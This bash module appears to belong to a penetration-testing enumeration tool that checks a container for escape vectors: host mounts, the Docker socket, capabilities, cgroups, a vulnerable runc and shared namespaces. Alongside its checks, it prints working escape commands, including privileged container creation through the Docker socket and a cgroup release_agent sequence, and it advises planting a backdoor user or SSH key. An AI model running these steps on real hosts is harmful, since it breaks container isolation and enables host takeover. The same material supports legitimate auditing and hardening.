#!/bin/bash

# Title: Container Escape Techniques
# Description: Advanced checks for container escape vectors and misconfigurations
# Author: Jonas Resch

# Check for container escape vectors via mounted host filesystems
check_mounted_filesystems() {
  print_subtitle "Mounted Host Filesystems"
  
  print_info "Checking for mounted host filesystems that could allow container escape..."
  
  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi
  
  # Check for mount points that might allow escape
  dangerous_mounts=()
  
  # Check /proc mount
  proc_mount=$(grep "/proc" /proc/mounts | head -n1)
  if [ -n "$proc_mount" ] && ! echo "$proc_mount" | grep -q "proc"; then
    dangerous_mounts+=("${RED}Host /proc is mounted: $proc_mount${NC}")
  fi
  
  # Check for host filesystem mounts
  host_mounts=$(grep -v "proc\|tmpfs\|cgroup\|sysfs\|devpts" /proc/mounts | grep -v "^overlay" | grep "/ ")
  if [ -n "$host_mounts" ]; then
    dangerous_mounts+=("${RED}Host root filesystem appears to be mounted: $host_mounts${NC}")
  fi
  
  # Check for docker socket mount
  if [ -e /var/run/docker.sock ]; then
    dangerous_mounts+=("${RED}Docker socket is mounted: /var/run/docker.sock${NC}")
  fi
  
  # Check for other suspicious mounts
  suspicious_dirs=("/host" "/var/lib/docker" "/var/lib/kubelet" "/var/run/docker" "/var/run/crio" "/var/lib/containerd")
  for dir in "${suspicious_dirs[@]}"; do
    if [ -d "$dir" ] && [ -r "$dir" ]; then
      dangerous_mounts+=("${RED}Suspicious directory mounted: $dir${NC}")
    fi
  done
  
  # Report findings
  if [ ${#dangerous_mounts[@]} -gt 0 ]; then
    print_critical "${RED}Found potential escape vectors via mounted filesystems:${NC}"
    for mount in "${dangerous_mounts[@]}"; do
      print_critical " ${RED}→ $mount${NC}"
    done
    
    print_critical "${RED}Exploitation guidance:${NC}"
    if [ -e /var/run/docker.sock ]; then
      print_critical " ${RED}→ Docker socket escape:${NC}"
      print_critical "   ${RED}curl -s --unix-socket /var/run/docker.sock http://localhost/images/json${NC}"
      print_critical "   ${RED}curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json${NC}"
      print_critical "   ${RED}→ Create a privileged container to escape:${NC}"
      print_critical "   ${RED}curl -s -X POST --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" http://localhost/containers/create?name=escape -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"],\"Privileged\":true}'${NC}"
      print_critical "   ${RED}curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/escape/start${NC}"
      print_critical "   ${RED}curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/escape/attach?stderr=1&stdin=1&stdout=1&stream=1${NC}"
    elif [ -n "$host_mounts" ]; then
      print_critical " ${RED}→ Host filesystem is mounted, you may be able to access host files directly${NC}"
      print_critical "   ${RED}→ Look for SSH keys, config files, and sensitive data${NC}"
      print_critical "   ${RED}→ Try to add a backdoor user to /etc/passwd or SSH authorized_keys${NC}"
    fi
  else
    print_success "No obvious filesystem escape vectors found"
  fi
}

# Check capabilities that may allow container escape
check_dangerous_capabilities() {
  print_subtitle "Dangerous Capabilities"
  
  print_info "Checking for capabilities that could allow container escape..."
  
  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi
  
  # Define dangerous capabilities and their exploitation methods
  declare -A cap_exploits
  cap_exploits["cap_sys_admin"]="Mount filesystems, perform privileged operations"
  cap_exploits["cap_sys_ptrace"]="Attach to host processes, read memory"
  cap_exploits["cap_sys_module"]="Load kernel modules"
  cap_exploits["cap_sys_rawio"]="Direct I/O access, potentially access disk devices"
  cap_exploits["cap_sys_time"]="Change system time"
  cap_exploits["cap_net_admin"]="Configure network, potentially sniff traffic"
  cap_exploits["cap_dac_override"]="Bypass file permission checks"
  cap_exploits["cap_dac_read_search"]="Bypass file read permission checks"
  cap_exploits["cap_chown"]="Change file ownership"
  cap_exploits["cap_setuid"]="Set UID, run as other users"
  cap_exploits["cap_setgid"]="Set GID, run as other groups"
  cap_exploits["cap_setfcap"]="Set file capabilities"
  
  # Get current capabilities
  if command_exists capsh; then
    caps=$(capsh --print 2>/dev/null)
    
    # More reliable way to check for specific capabilities
    found_dangerous=0
    
    for cap in "${!cap_exploits[@]}"; do
      # Simple string match against capsh output to see if the capability is present
      if echo "$caps" | grep -q "$cap"; then
        found_dangerous=1
        print_critical "${RED}Container has dangerous capability: $cap${NC}"
        print_critical " ${RED}→ Potential impact: ${cap_exploits[$cap]}${NC}"
        
        # Specific exploitation guidance for each capability
        case "$cap" in
          "cap_sys_admin")
            print_critical " ${RED}→ Exploitation method:${NC}"
            print_critical "   ${RED}# Mount host filesystem and access it${NC}"
            print_critical "   ${RED}mkdir -p /tmp/escape${NC}"
            print_critical "   ${RED}mount -t proc proc /proc # If not already mounted${NC}"
            print_critical "   ${RED}cd /tmp/escape${NC}"
            print_critical "   ${RED}mount -t cgroup -o memory cgroup /tmp/escape${NC}"
            print_critical "   ${RED}mkdir -p payload${NC}"
            print_critical "   ${RED}echo 1 > payload/notify_on_release${NC}"
            print_critical "   ${RED}echo \"$\$\" > payload/release_agent${NC}"
            print_critical "   ${RED}echo '#!/bin/sh' > /tmp/payload.sh${NC}"
            print_critical "   ${RED}echo 'ps aux > /tmp/payload-output' >> /tmp/payload.sh${NC}"
            print_critical "   ${RED}chmod +x /tmp/payload.sh${NC}"
            print_critical "   ${RED}# Trigger the exploit${NC}"
            print_critical "   ${RED}sh -c \"echo \\\$\\\$ > payload/cgroup.procs\"${NC}"
            ;;
          "cap_sys_ptrace")
            print_critical " ${RED}→ Exploitation method:${NC}"
            print_critical "   ${RED}# Use ptrace to attach to host processes${NC}"
            print_critical "   ${RED}ps -ef # Look for host processes${NC}"
            print_critical "   ${RED}gdb -p PID # Attach to a process${NC}"
            ;;
          "cap_sys_module")
            print_critical " ${RED}→ Exploitation method:${NC}"
            print_critical "   ${RED}# Load a kernel module to gain root access${NC}"
            print_critical "   ${RED}echo 'int init_module() { return 0; }' > module.c${NC}"
            print_critical "   ${RED}echo 'void cleanup_module() { }' >> module.c${NC}"
            print_critical "   ${RED}# Compile and insmod the module${NC}"
            ;;
        esac
      fi
    done
    
    if [ $found_dangerous -eq 0 ]; then
      print_success "No dangerous capabilities found"
    fi
  elif [ -r /proc/self/status ]; then
    # Alternative method if capsh isn't available
    cap_eff=$(grep -i "^CapEff:" /proc/self/status 2>/dev/null | cut -f2)
    
    if [ -n "$cap_eff" ]; then
      # Check for dangerous capabilities using bit positions
      # Using a more reliable method that handles 64-bit integers
      
      found_dangerous=0
      
      # Map of capability bit positions
      # Based on linux/include/uapi/linux/capability.h
      declare -A cap_bits
      cap_bits["cap_sys_admin"]=21
      cap_bits["cap_sys_ptrace"]=19
      cap_bits["cap_sys_module"]=16
      cap_bits["cap_sys_rawio"]=17
      cap_bits["cap_sys_time"]=25
      cap_bits["cap_net_admin"]=12
      cap_bits["cap_dac_override"]=1
      cap_bits["cap_dac_read_search"]=2
      cap_bits["cap_chown"]=0
      cap_bits["cap_setuid"]=7
      cap_bits["cap_setgid"]=6
      cap_bits["cap_setfcap"]=31
      
      # Convert hex to binary for easier bit checking
      cap_bin=$(echo "ibase=16; obase=2; ${cap_eff^^}" | bc 2>/dev/null)
      
      if [ -n "$cap_bin" ]; then
        # Pad with leading zeros to ensure proper bit positions
        cap_bin=$(printf "%064s" "$cap_bin" | tr ' ' '0')
        
        for cap in "${!cap_bits[@]}"; do
          bit_pos=${cap_bits[$cap]}
          # Calculate the correct bit position from the right
          check_pos=$((${#cap_bin} - bit_pos - 1))
          
          # Check if the bit is set (1)
          if [ $check_pos -ge 0 ] && [ "${cap_bin:$check_pos:1}" = "1" ]; then
            found_dangerous=1
            print_critical "${RED}Container has dangerous capability: $cap${NC}"
            print_critical " ${RED}→ Potential impact: ${cap_exploits[$cap]}${NC}"
          fi
        done
      else
        # Fallback if bc is not available
        print_warning "${YELLOW}Container has capabilities, but can't decode them (bc not available)${NC}"
        print_warning " ${YELLOW}→ CapEff: $cap_eff${NC}"
        
        # Simple pattern-based checks for critical capability bits
        if [ "$cap_eff" != "0000000000000000" ] && [ "$cap_eff" != "0" ]; then
          # Check for common known patterns that indicate dangerous capabilities
          if [[ "$cap_eff" == *"0000001f"* ]] || [[ "$cap_eff" == *"ffffffff"* ]]; then
            print_critical "${RED}Container likely has dangerous capabilities (based on capability mask)${NC}"
          fi
        fi
      fi
      
      if [ $found_dangerous -eq 0 ]; then
        print_success "No dangerous capabilities found"
      fi
    else
      print_warning "Could not determine container capabilities"
    fi
  else
    print_warning "Could not determine container capabilities"
  fi
}

# Check for kernel modules that could be used for escape
check_kernel_modules() {
  print_subtitle "Kernel Module Escape"
  
  print_info "Checking for kernel modules that could be exploited..."
  
  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi
  
  # Check if we have access to /proc
  if [ ! -r /proc/modules ]; then
    print_warning "Cannot access /proc/modules, skipping kernel module check"
    return
  fi
  
  # Dangerous modules that could be exploited
  dangerous_modules=("nf_nat" "xt_MASQUERADE" "overlay" "kvm" "vboxdrv" "vboxnetflt")
  
  # Check loaded modules
  loaded_dangerous=()
  
  for module in "${dangerous_modules[@]}"; do
    if grep -q "^$module " /proc/modules 2>/dev/null; then
      loaded_dangerous+=("$module")
    fi
  done
  
  # Report findings
  if [ ${#loaded_dangerous[@]} -gt 0 ]; then
    print_warning "${YELLOW}Found potentially exploitable kernel modules:${NC}"
    for module in "${loaded_dangerous[@]}"; do
      print_warning " ${YELLOW}→ $module${NC}"
    done
    
    # Specific exploitation advice for some modules
    for module in "${loaded_dangerous[@]}"; do
      case "$module" in
        "overlay")
          print_critical " ${RED}→ overlay module exploitation:${NC}"
          print_critical "   ${RED}This module has had multiple vulnerabilities that allow container escape${NC}"
          print_critical "   ${RED}Check for CVE-2021-30465, CVE-2021-3178${NC}"
          ;;
        "nf_nat" | "xt_MASQUERADE")
          print_warning " ${YELLOW}→ Networking modules might allow for network manipulation${NC}"
          ;;
      esac
    done
  else
    print_success "No obviously exploitable kernel modules found"
  fi
}

# Check for cgroup release_agent exploitation method
check_cgroup_escape() {
  print_subtitle "CGroup Release_Agent Escape"
  
  print_info "Checking for cgroup release_agent escape vector..."
  
  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi
  
  # Check for CGROUPs mount with memory controller
  cgroup_mount=$(grep "cgroup" /proc/mounts | grep -E "memory|devices|freezer" | head -n1)
  
  if [ -n "$cgroup_mount" ]; then
    cgroup_path=$(echo "$cgroup_mount" | awk '{print $2}')
    
    if [ -d "$cgroup_path" ] && [ -w "$cgroup_path" ]; then
      print_critical "${RED}Writable cgroup mount point found: $cgroup_path${NC}"
      print_critical " ${RED}→ This might be exploitable for container escape via release_agent${NC}"
      print_critical " ${RED}→ Exploitation steps:${NC}"
      print_critical "   ${RED}mkdir -p $cgroup_path/payload${NC}"
      print_critical "   ${RED}echo 1 > $cgroup_path/payload/notify_on_release${NC}"
      print_critical "   ${RED}host_path=\$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)${NC}"
      print_critical "   ${RED}echo \"\$host_path/cmd\" > $cgroup_path/release_agent${NC}"
      print_critical "   ${RED}echo '#!/bin/sh' > /cmd${NC}"
      print_critical "   ${RED}echo 'ps > /output' >> /cmd${NC}"
      print_critical "   ${RED}chmod +x /cmd${NC}"
      print_critical "   ${RED}sh -c \"echo \$\$ > $cgroup_path/payload/cgroup.procs\"${NC}"
      return
    fi
  fi
  
  # Alternative check - try to write to memory subsystem
  if [ -d "/sys/fs/cgroup/memory" ]; then
    if [ -w "/sys/fs/cgroup/memory" ]; then
      print_critical "${RED}Writable cgroup memory subsystem found: /sys/fs/cgroup/memory${NC}"
      print_critical " ${RED}→ This might be exploitable for container escape via release_agent${NC}"
      return
    fi
  fi
  
  print_success "No exploitable cgroup configuration found"
}

# Check for CVE-2019-5736 (runc vulnerability)
check_runc_exploit() {
  print_subtitle "RunC Vulnerability (CVE-2019-5736)"
  
  print_info "Checking for indicators of CVE-2019-5736 runc vulnerability..."
  
  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi
  
  # Check Docker version if available
  if command_exists docker; then
    docker_version=$(docker --version 2>/dev/null | grep -oP "Docker version \K[0-9\.]+")
    
    if [ -n "$docker_version" ]; then
      if [[ "$(echo "$docker_version" | cut -d. -f1)" -lt "18" ]] || 
         [[ "$(echo "$docker_version" | cut -d. -f1)" -eq "18" && "$(echo "$docker_version" | cut -d. -f2)" -lt "9" ]]; then
        print_critical "${RED}Docker version $docker_version might be vulnerable to CVE-2019-5736${NC}"
        print_critical " ${RED}→ Vulnerable versions: Docker < 18.09.2${NC}"
        print_critical " ${RED}→ This container escape exploit can overwrite the host runc binary${NC}"
      else
        print_success "Docker version $docker_version is likely not vulnerable to CVE-2019-5736"
      fi
    fi
  fi
  
  # Check /proc/self/exe
  if [ -w "/proc/self/exe" ]; then
    print_critical "${RED}/proc/self/exe is writable, which may indicate vulnerability to CVE-2019-5736${NC}"
  fi
  
  # Check runc binary
  if [ -f "/usr/bin/runc" ] || [ -f "/usr/sbin/runc" ]; then
    runc_path=$(which runc 2>/dev/null)
    
    if [ -n "$runc_path" ]; then
      runc_version=$(runc --version 2>/dev/null | grep -oP "runc version \K[0-9\.]+")
      
      if [ -n "$runc_version" ]; then
        if [[ "$(echo "$runc_version" | cut -d. -f1)" -lt "1" ]] ||
           [[ "$(echo "$runc_version" | cut -d. -f1)" -eq "1" && "$(echo "$runc_version" | cut -d. -f2)" -eq "0" && "$(echo "$runc_version" | cut -d. -f3)" -lt "0" ]] ||
           [[ "$runc_version" == "1.0.0-rc6" ]] || [[ "$runc_version" == "1.0.0-rc5" ]] || [[ "$runc_version" == "1.0.0-rc4" ]] || [[ "$runc_version" == "1.0.0-rc3" ]] || [[ "$runc_version" == "1.0.0-rc2" ]] || [[ "$runc_version" == "1.0.0-rc1" ]]; then
          print_critical "${RED}RunC version $runc_version is vulnerable to CVE-2019-5736${NC}"
          print_critical " ${RED}→ This container escape exploit can overwrite the host runc binary${NC}"
        else
          print_success "RunC version $runc_version is not vulnerable to CVE-2019-5736"
        fi
      else
        print_warning "${YELLOW}RunC found but couldn't determine version${NC}"
      fi
    fi
  fi
}

# Check for access to host namespaces
check_namespace_exposure() {
  print_subtitle "Namespace Exposure"
  
  print_info "Checking for exposure to host namespaces..."
  
  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi
  
  # Check for shared namespaces with host
  shared_ns=()
  
  # Check each namespace type
  ns_types=("ipc" "net" "pid" "user" "uts")
  
  for ns in "${ns_types[@]}"; do
    # Check if namespace is shared with host
    if [ -L "/proc/1/ns/$ns" ] && [ -L "/proc/self/ns/$ns" ]; then
      host_ns=$(readlink "/proc/1/ns/$ns" 2>/dev/null)
      container_ns=$(readlink "/proc/self/ns/$ns" 2>/dev/null)
      
      if [ "$host_ns" = "$container_ns" ]; then
        shared_ns+=("$ns")
      fi
    fi
  done
  
  # Report shared namespaces
  if [ ${#shared_ns[@]} -gt 0 ]; then
    print_critical "${RED}Container shares namespaces with host:${NC}"
    
    for ns in "${shared_ns[@]}"; do
      print_critical " ${RED}→ $ns namespace${NC}"
      
      # Specific advice based on namespace type
      case "$ns" in
        "net")
          print_critical "   ${RED}→ Network namespace shared: Container can access host network interfaces${NC}"
          print_critical "   ${RED}→ Can potentially sniff host traffic or access services bound to localhost${NC}"
          ;;
        "pid")
          print_critical "   ${RED}→ PID namespace shared: Container can see and potentially interact with host processes${NC}"
          print_critical "   ${RED}→ Try: ps aux | grep -v 'container\|docker'${NC}"
          ;;
        "user")
          print_critical "   ${RED}→ User namespace shared: Container may have same user privileges as host${NC}"
          ;;
        "ipc")
          print_critical "   ${RED}→ IPC namespace shared: Container can communicate with host processes via IPC${NC}"
          ;;
        "uts")
          print_critical "   ${RED}→ UTS namespace shared: Container shares hostname with host${NC}"
          ;;
      esac
    done
  else
    print_success "Container appears to have proper namespace isolation"
  fi
}

# Run all container escape checks
container_escape_checks() {
  print_title "Container Escape Vectors"
  
  # Run all container escape checks
  check_mounted_filesystems
  check_dangerous_capabilities
  check_kernel_modules
  check_cgroup_escape
  check_runc_exploit
  check_namespace_exposure
  
  # Wait for user if wait mode is enabled
  wait_for_user
} 